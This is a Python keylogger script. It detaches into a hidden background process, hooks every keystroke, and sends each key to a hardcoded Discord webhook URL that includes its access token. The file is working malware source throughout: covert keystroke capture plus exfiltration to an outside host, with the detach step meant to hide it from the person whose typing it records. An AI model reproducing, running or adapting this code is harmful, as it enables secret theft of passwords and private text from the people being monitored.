#!/usr/bin/env python3
import subprocess
import sys
import os
import requests
import keyboard
import time

# Your webhook URL
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1402658719006982309/XjcAaLCvIEPEIagGHeiIf9b8JwuUdJMFYL_A4-voHKa8t6Nzm7RW_yGkzygIFDrfLvKe"

def detach_and_run():
    """Detach the process and run in background"""
    if len(sys.argv) == 1:  # First run - no arguments
        # Restart itself with background flag
        if os.name == 'nt':  # Windows
            subprocess.Popen([
                sys.executable, __file__, '--background'
            ], creationflags=subprocess.CREATE_NO_WINDOW)
        else:  # Linux/macOS
            with open(os.devnull, 'w') as devnull:
                subprocess.Popen([
                    sys.executable, __file__, '--background'
                ], stdout=devnull, stderr=devnull)
        
        sys.exit()  # Exit the original terminal process silently
    
    # If we get here, we're running in background mode
    main_program()

def main_program():
    """Your keylogger code"""
    last_key_time = {}  # Track timing to prevent duplicates
    
    def send_to_discord(message):
        data = {"content": f"```\n{message}\n```"}
        try:
            response = requests.post(WEBHOOK_URL, json=data)
            if response.status_code == 204:
                print("Message sent successfully")
            else:
                print(f"Failed to send message: {response.status_code}")
        except Exception as e:
            print(f"Error sending to Discord: {e}")

    def on_press(event):
        if event.event_type == keyboard.KEY_DOWN:
            current_time = time.time()
            key_name = event.name
            
            # Prevent sending same key twice within 0.1 seconds
            if key_name in last_key_time:
                if current_time - last_key_time[key_name] < 0.1:
                    return  # Skip this duplicate
            
            last_key_time[key_name] = current_time
            key_info = f"Key pressed: {key_name}"
            print(key_info)
            send_to_discord(key_info)

    # Set up the keyboard hook
    keyboard.hook(on_press)
    print("Keylogger started. Press Ctrl+C to stop.")
    try:
        # Keep the program running
        keyboard.wait()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
        keyboard.unhook_all()

if __name__ == "__main__":
    detach_and_run()